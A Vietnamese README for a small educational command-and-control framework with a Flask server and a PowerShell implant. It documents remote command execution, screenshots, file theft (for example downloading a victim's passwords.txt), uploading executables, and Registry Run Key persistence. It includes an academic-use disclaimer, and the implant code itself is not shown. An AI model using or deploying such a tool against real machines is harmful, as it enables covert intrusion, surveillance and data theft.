# MiniC2

Project demo mô hình C2 (Command & Control) đơn giản về cách malware giao tiếp và điều khiển máy tính từ xa. Server viết bằng Python (Flask), Agent viết bằng PowerShell.

## ⚙️ Chức năng
1.  **Remote Shell:** Gửi lệnh CMD từ server xuống agent thực thi.
2.  **Screenshot:** Chụp màn hình máy nạn nhân gửi về server.
3.  **File Transfer:**
    * Download file từ Agent về Server.
    * Upload file từ Server xuống Agent.
4.  **Persistence:** Tự động cài đặt Agent khởi động cùng Windows (qua Registry Run Key).

## 🛠️ Cài đặt & Chạy

### 1. Server (Attacker)

**Bước 1:** Cài thư viện cần thiết
**Bước 2:** Chạy Server

```bash
python server.py
```

Server sẽ mở port `8080` và tạo thư mục `loot` để chứa dữ liệu thu thập được.

### 2\. Agent (Victim)

Hệ điều hành Windows.

**Bước 1:** Mở file `agent.ps1`.

**Bước 2:** Sửa dòng đầu tiên thành IP của máy Server:

```powershell
$server_url = "http://<IP_CUA_SERVER>:8080"
```

*(Nếu chạy local để test thì giữ nguyên 127.0.0.1)*

**Bước 3:** Chạy script trên máy nạn nhân.

## 🎮 Hướng dẫn sử dụng (Command Center)

Chạy `server.py`, chờ một chút sẽ hiện ra `C2 >`:

### 1\. Xem danh sách các Agent ID đang kết nối

```bash
list
```

### 2\. Gửi lệnh CMD thông thường

Cú pháp: `set <ID> <lệnh_cmd>`
Ví dụ:

```bash
set A1B2C3 whoami
set A1B2C3 dir c:\
set A1B2C3 ipconfig
```

### 3\. Chụp màn hình

Cú pháp: `set <ID> screenshot`

  * Ảnh sẽ được lưu vào thư mục `loot/` trên server.

### 4\. Tải file về (Download)

Agent &rarr; Server
Cú pháp: `set <ID> download <đường_dẫn_trên_agent>`
Ví dụ:

```bash
set A1B2C3 download C:\Users\Admin\Desktop\passwords.txt
```

  * File tải về nằm trong thư mục `loot/`.

### 5\. Đẩy file lên (Upload)

Server &rarr; Agent
Cú pháp: `upload <ID> <file_trên_server> <đường_dẫn_lưu_trên_agent>`
Ví dụ:

```bash
upload A1B2C3 file.exe C:\Windows\Temp\file.exe
```

### 6\. Persistence

Cú pháp: `set <ID> persistence`
Lệnh này sẽ copy script vào thư mục ẩn và thêm key vào Registry để script tự chạy mỗi khi bật máy.

## 📂 Cấu trúc thư mục

  * `server.py`: Code server.
  * `agent.ps1`: Code client (implant).
  * `loot/`: Thư mục tự động tạo ra để chứa ảnh chụp màn hình và file download.

## 📚 Tham khảo

Project này dựa trên ý tưởng từ blog của **0xRick**.
Link: https://0xrick.github.io/misc/c2/

## ⚠️ Disclaimer

Code chỉ dùng cho mục đích **NGHIÊN CỨU VÀ HỌC TẬP**. Không sử dụng vào mục đích phi pháp hoặc tấn công hệ thống không được phép.
